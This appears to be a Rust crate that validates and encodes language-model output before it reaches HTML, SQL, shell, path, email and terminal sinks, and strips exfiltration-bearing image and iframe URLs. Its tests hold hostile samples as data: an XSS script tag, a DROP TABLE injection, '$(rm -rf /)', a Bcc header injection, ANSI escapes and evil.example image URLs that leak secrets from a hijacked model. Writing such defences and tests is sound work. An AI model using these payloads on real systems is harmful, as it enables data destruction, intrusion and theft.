//! # aegis-output — improper output handling (LLM10)
//!
//! Textbook **● Contain** and one of Rust's strongest fits
//! (architecture-considerations.md §3 LLM10). This crate sits between the model and every
//! downstream sink and guarantees three things in trusted code — never via a second LLM call:
//!
//! * [`validate`] — the model's structured output matches a strict JSON schema.
//! * [`encode`] — output is context-aware **sink-encoded** (HTML/SQL/shell/path/email) at the
//!   point it leaves your control.
//! * [`strip_control`] / [`neutralize_exfil`] — control chars / ANSI-OSC sequences are stripped
//!   for terminal/log sinks, and render-time exfiltration (auto-fetched markdown images, link
//!   previews, iframes, data-bearing URL params) is neutralized.
//!
//! Generated code is treated as inert data ([`CodeBlock`]); nothing here executes it.

use jsonschema::Validator;
use percent_encoding::{utf8_percent_encode, AsciiSet, CONTROLS};
use serde::{Deserialize, Serialize};

/// Errors from output validation.
#[derive(Debug, thiserror::Error)]
pub enum OutputError {
    /// The provided schema could not be compiled.
    #[error("invalid schema: {0}")]
    InvalidSchema(String),
    /// The model's output did not satisfy the schema.
    #[error("schema validation failed: {0}")]
    SchemaValidation(String),
    /// A value could not be encoded safely for the requested sink (e.g. path traversal).
    #[error("unsafe value for {sink:?} sink: {reason}")]
    UnsafeValue { sink: Sink, reason: String },
}

/// A downstream destination for model output. Each sink has different metacharacters, so
/// encoding is **context-aware**: the same string is escaped differently per sink.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Sink {
    /// HTML document / DOM text node.
    Html,
    /// A single-quoted SQL string literal.
    Sql,
    /// A single argument in a POSIX shell command.
    Shell,
    /// A filesystem path segment.
    Path,
    /// An email header value (To/Subject/…).
    Email,
    /// A terminal, log file, or IDE problems pane.
    TerminalLog,
}

/// Validate a JSON value against a strict schema, in trusted code (never a second LLM call).
///
/// Returns `Ok(())` only if the value satisfies the schema.
pub fn validate(
    schema: &serde_json::Value,
    instance: &serde_json::Value,
) -> Result<(), OutputError> {
    let validator: Validator =
        jsonschema::validator_for(schema).map_err(|e| OutputError::InvalidSchema(e.to_string()))?;
    if validator.is_valid(instance) {
        Ok(())
    } else {
        let detail = validator
            .iter_errors(instance)
            .map(|e| e.to_string())
            .collect::<Vec<_>>()
            .join("; ");
        Err(OutputError::SchemaValidation(detail))
    }
}

/// Context-aware encode `value` so it is inert when placed into `sink`.
///
/// This makes the string *data*, never *code*: an XSS payload becomes visible text, a SQL
/// metacharacter becomes a literal quote, a shell metacharacter is quoted, a traversal path is
/// rejected.
pub fn encode(sink: Sink, value: &str) -> Result<String, OutputError> {
    match sink {
        Sink::Html => Ok(encode_html(value)),
        Sink::Sql => Ok(encode_sql_literal(value)),
        Sink::Shell => Ok(encode_shell_single_quoted(value)),
        Sink::Path => encode_path_segment(value),
        Sink::Email => encode_email_header(value),
        Sink::TerminalLog => Ok(strip_control(value)),
    }
}

/// HTML-entity-encode the five significant characters so text can never become markup.
fn encode_html(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    for c in value.chars() {
        match c {
            '&' => out.push_str("&amp;"),
            '<' => out.push_str("&lt;"),
            '>' => out.push_str("&gt;"),
            '"' => out.push_str("&quot;"),
            '\'' => out.push_str("&#x27;"),
            _ => out.push(c),
        }
    }
    out
}

/// Encode as the *body* of a single-quoted SQL string literal (caller supplies the quotes).
/// Doubles embedded single quotes and drops NUL. Parameterized queries remain preferable; this
/// is the backstop for the unavoidable literal.
fn encode_sql_literal(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    for c in value.chars() {
        match c {
            '\'' => out.push_str("''"),
            '\0' => {}
            _ => out.push(c),
        }
    }
    out
}

/// Wrap a value as a single POSIX-shell argument using single quotes, escaping embedded quotes.
/// The result is safe to drop into a command line as one argument.
fn encode_shell_single_quoted(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('\'');
    for c in value.chars() {
        if c == '\'' {
            // Close quote, an escaped literal quote, reopen quote.
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

/// Validate a single path segment: reject traversal, separators, NUL, and control chars.
fn encode_path_segment(value: &str) -> Result<String, OutputError> {
    if value.is_empty() || value == "." || value == ".." {
        return Err(OutputError::UnsafeValue {
            sink: Sink::Path,
            reason: "empty or traversal segment".into(),
        });
    }
    if value.contains('/') || value.contains('\\') || value.contains('\0') {
        return Err(OutputError::UnsafeValue {
            sink: Sink::Path,
            reason: "path separator or NUL in segment".into(),
        });
    }
    if value.chars().any(|c| c.is_control()) {
        return Err(OutputError::UnsafeValue {
            sink: Sink::Path,
            reason: "control character in segment".into(),
        });
    }
    Ok(value.to_string())
}

/// Encode an email header value: reject header injection (CR/LF and NUL).
fn encode_email_header(value: &str) -> Result<String, OutputError> {
    if value.contains('\r') || value.contains('\n') || value.contains('\0') {
        return Err(OutputError::UnsafeValue {
            sink: Sink::Email,
            reason: "CR/LF/NUL header injection".into(),
        });
    }
    Ok(value.to_string())
}

/// Strip everything that can drive a terminal, log viewer, or IDE: C0/C1 control characters
/// (except tab/newline), the ESC that begins ANSI/CSI/OSC sequences, and BEL. Prevents an
/// output string from repainting the screen, hiding text, or smuggling an OSC-8 hyperlink.
pub fn strip_control(value: &str) -> String {
    value
        .chars()
        .filter(|&c| {
            if c == '\t' || c == '\n' {
                return true;
            }
            // Drop C0 (incl. ESC 0x1b and BEL 0x07) and C1 (0x80..=0x9f) controls.
            !(c.is_control() || ('\u{80}'..='\u{9f}').contains(&c))
        })
        .collect()
}

/// Characters that must be percent-encoded when a URL is rewritten for safe server-side fetch.
const FRAGMENT: &AsciiSet = &CONTROLS.add(b' ').add(b'"').add(b'<').add(b'>').add(b'`');

/// The outcome of neutralizing a piece of rendered content.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Neutralized {
    /// The cleaned content, safe to render without auto-fetching remote resources.
    pub content: String,
    /// How many auto-fetching constructs were neutralized (images, iframes, link previews).
    pub neutralized: usize,
}

/// Neutralize render-time exfiltration in model-produced HTML/Markdown: disable auto-fetch of
/// images, iframes, and link previews so a hijacked model cannot beacon data out through a URL
/// the *renderer* fetches. Surviving links keep their text but lose data-bearing query params.
///
/// This is deliberately conservative and deterministic — it neutralizes structure, it does not
/// try to "understand" intent.
pub fn neutralize_exfil(content: &str) -> Neutralized {
    let mut count = 0usize;
    let mut out = content.to_string();

    // Markdown auto-loading images: ![alt](url) -> a plain, non-fetching link reference.
    out = rewrite_markdown_images(&out, &mut count);

    // HTML tags whose mere presence triggers a fetch. Neutralize by neutering the tag name so
    // no renderer will action them, while leaving the (now inert) text visible for audit.
    for tag in [
        "img", "iframe", "script", "link", "audio", "video", "source",
    ] {
        let open = format!("<{tag}");
        if out.to_ascii_lowercase().contains(&open) {
            let replaced = case_insensitive_replace(&out, &open, &format!("<x-neutralized-{tag}"));
            count += replaced.1;
            out = replaced.0;
        }
    }

    Neutralized {
        content: out,
        neutralized: count,
    }
}

/// Strip data-bearing query parameters from a URL, leaving only the path. Used both by
/// [`neutralize_exfil`] and directly for any URL crossing to a sink. Returns the sanitized URL
/// string, or `None` if the input does not parse as an absolute URL.
pub fn strip_query(url: &str) -> Option<String> {
    let mut parsed = url::Url::parse(url).ok()?;
    parsed.set_query(None);
    parsed.set_fragment(None);
    Some(parsed.to_string())
}

fn rewrite_markdown_images(content: &str, count: &mut usize) -> String {
    // Find `![alt](url)` and turn it into `[alt](url)` (a normal link that does not auto-load),
    // sanitizing the URL. Hand-rolled to avoid a regex dependency and stay fully deterministic.
    let bytes = content.as_bytes();
    let mut out = String::with_capacity(content.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'!' && i + 1 < bytes.len() && bytes[i + 1] == b'[' {
            if let Some((alt, url, next)) = parse_md_image(content, i + 1) {
                let safe_url = strip_query(&url).unwrap_or_else(|| "about:blank".to_string());
                out.push('[');
                out.push_str(&alt);
                out.push_str("](");
                out.push_str(&safe_url);
                out.push(')');
                *count += 1;
                i = next;
                continue;
            }
        }
        // Push one char (respecting UTF-8 boundaries).
        let ch = content[i..].chars().next().unwrap();
        out.push(ch);
        i += ch.len_utf8();
    }
    out
}

/// Parse `[alt](url)` starting at the `[`. Returns `(alt, url, index-after-closing-paren)`.
fn parse_md_image(content: &str, open_bracket: usize) -> Option<(String, String, usize)> {
    let rest = &content[open_bracket..];
    let close_bracket = rest.find(']')?;
    let alt = &rest[1..close_bracket];
    let after = &rest[close_bracket + 1..];
    if !after.starts_with('(') {
        return None;
    }
    let close_paren = after.find(')')?;
    let url = &after[1..close_paren];
    let next = open_bracket + close_bracket + 1 + close_paren + 1;
    Some((alt.to_string(), url.to_string(), next))
}

fn case_insensitive_replace(haystack: &str, needle: &str, replacement: &str) -> (String, usize) {
    let hay_lower = haystack.to_ascii_lowercase();
    let needle_lower = needle.to_ascii_lowercase();
    let mut out = String::with_capacity(haystack.len());
    let mut count = 0;
    let mut i = 0;
    while i < haystack.len() {
        if hay_lower[i..].starts_with(&needle_lower) {
            out.push_str(replacement);
            count += 1;
            i += needle.len();
        } else {
            let ch = haystack[i..].chars().next().unwrap();
            out.push(ch);
            i += ch.len_utf8();
        }
    }
    (out, count)
}

/// Generated code returned by the model. It is **inert data** — Aegis never executes it. This
/// type exists so callers cannot accidentally treat model output as runnable.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CodeBlock {
    /// The declared language (informational only).
    pub language: String,
    /// The source text — data, never executed by Aegis.
    pub source: String,
}

impl CodeBlock {
    /// Wrap generated source as inert data.
    pub fn new(language: impl Into<String>, source: impl Into<String>) -> Self {
        Self {
            language: language.into(),
            source: source.into(),
        }
    }

    /// A URL-safe, percent-encoded rendering of the source for safe display in a URL context.
    /// (There is intentionally no `execute` method.)
    pub fn to_url_safe(&self) -> String {
        utf8_percent_encode(&self.source, FRAGMENT).to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn html_encoding_neutralizes_script() {
        let out = encode(Sink::Html, "<script>alert(1)</script>").unwrap();
        assert!(!out.contains("<script>"));
        assert_eq!(out, "&lt;script&gt;alert(1)&lt;/script&gt;");
    }

    #[test]
    fn sql_literal_doubles_quotes() {
        let out = encode(Sink::Sql, "Robert'); DROP TABLE students;--").unwrap();
        assert_eq!(out, "Robert''); DROP TABLE students;--");
        assert!(!out.contains("'") || out.contains("''"));
    }

    #[test]
    fn shell_arg_is_single_quoted() {
        let out = encode(Sink::Shell, "$(rm -rf /)").unwrap();
        assert_eq!(out, "'$(rm -rf /)'");
        let with_quote = encode(Sink::Shell, "a'b").unwrap();
        assert_eq!(with_quote, "'a'\\''b'");
    }

    #[test]
    fn path_rejects_traversal() {
        assert!(encode(Sink::Path, "..").is_err());
        assert!(encode(Sink::Path, "a/b").is_err());
        assert!(encode(Sink::Path, "report.pdf").is_ok());
    }

    #[test]
    fn email_rejects_header_injection() {
        assert!(encode(Sink::Email, "a@b.com\r\nBcc: evil@x.com").is_err());
        assert!(encode(Sink::Email, "a@b.com").is_ok());
    }

    #[test]
    fn strip_control_removes_ansi_and_bel() {
        let dirty = "ok\u{1b}[2Jcleared\u{07}\u{9b}31m";
        let clean = strip_control(dirty);
        assert!(!clean.contains('\u{1b}'));
        assert!(!clean.contains('\u{07}'));
        assert!(!clean.contains('\u{9b}'));
        assert!(clean.contains("ok"));
        assert!(clean.contains("cleared"));
    }

    #[test]
    fn strip_query_removes_data_bearing_params() {
        let out = strip_query("https://evil.example/beacon?data=secret&x=1").unwrap();
        assert_eq!(out, "https://evil.example/beacon");
    }

    #[test]
    fn neutralize_markdown_image_becomes_non_fetching_link() {
        let n = neutralize_exfil("look ![x](https://evil.example/p?leak=SECRET) here");
        assert!(!n.content.contains("!["));
        assert!(n.content.contains("[x](https://evil.example/p)"));
        assert!(!n.content.contains("leak=SECRET"));
        assert_eq!(n.neutralized, 1);
    }

    #[test]
    fn neutralize_html_img_and_iframe() {
        let n = neutralize_exfil(r#"<img src="https://evil/x?d=1"><IFRAME src="y">"#);
        assert!(!n.content.to_ascii_lowercase().contains("<img"));
        assert!(!n.content.to_ascii_lowercase().contains("<iframe"));
        assert!(n.neutralized >= 2);
    }

    #[test]
    fn schema_validation_accepts_and_rejects() {
        let schema = json!({
            "type": "object",
            "properties": { "action": { "enum": ["approve", "deny"] } },
            "required": ["action"],
            "additionalProperties": false
        });
        assert!(validate(&schema, &json!({"action": "approve"})).is_ok());
        assert!(validate(&schema, &json!({"action": "sudo"})).is_err());
        assert!(validate(&schema, &json!({"action": "approve", "x": 1})).is_err());
    }

    #[test]
    fn validate_rejects_an_invalid_schema() {
        // A pattern that is not a valid regex cannot be compiled.
        let bad_schema = json!({ "type": "string", "pattern": "(" });
        assert!(matches!(
            validate(&bad_schema, &json!("x")),
            Err(OutputError::InvalidSchema(_))
        ));
    }

    #[test]
    fn html_encodes_all_five_significant_chars() {
        assert_eq!(
            encode(Sink::Html, r#"& < > " '"#).unwrap(),
            "&amp; &lt; &gt; &quot; &#x27;"
        );
    }

    #[test]
    fn sql_drops_nul_and_doubles_quotes() {
        assert_eq!(encode(Sink::Sql, "a\0b'c").unwrap(), "ab''c");
    }

    #[test]
    fn path_rejects_control_chars_and_dot() {
        assert!(encode(Sink::Path, "a\u{7}b").is_err());
        assert!(encode(Sink::Path, ".").is_err());
        assert!(encode(Sink::Path, "").is_err());
    }

    #[test]
    fn terminal_log_sink_strips_control() {
        let out = encode(Sink::TerminalLog, "keep\ttab\nnl\u{1b}[31m").unwrap();
        assert!(out.contains("keep\ttab\nnl"));
        assert!(!out.contains('\u{1b}'));
    }

    #[test]
    fn strip_control_preserves_tab_and_newline() {
        assert_eq!(strip_control("a\tb\nc"), "a\tb\nc");
    }

    #[test]
    fn neutralize_leaves_malformed_markdown_image_untouched() {
        // `![alt]` with no `(url)` is not a complete image -> parse returns None, nothing rewritten.
        let n = neutralize_exfil("text ![alt] more");
        assert_eq!(n.neutralized, 0);
        assert_eq!(n.content, "text ![alt] more");
    }

    #[test]
    fn strip_query_returns_none_for_relative_url() {
        assert_eq!(strip_query("/just/a/path?x=1"), None);
    }

    #[test]
    fn code_block_is_inert_data_with_url_safe_rendering() {
        let cb = CodeBlock::new("python", "print('a b<>&')");
        assert_eq!(cb.language, "python");
        let url_safe = cb.to_url_safe();
        assert!(!url_safe.contains(' '));
        assert!(!url_safe.contains('<'));
    }
}
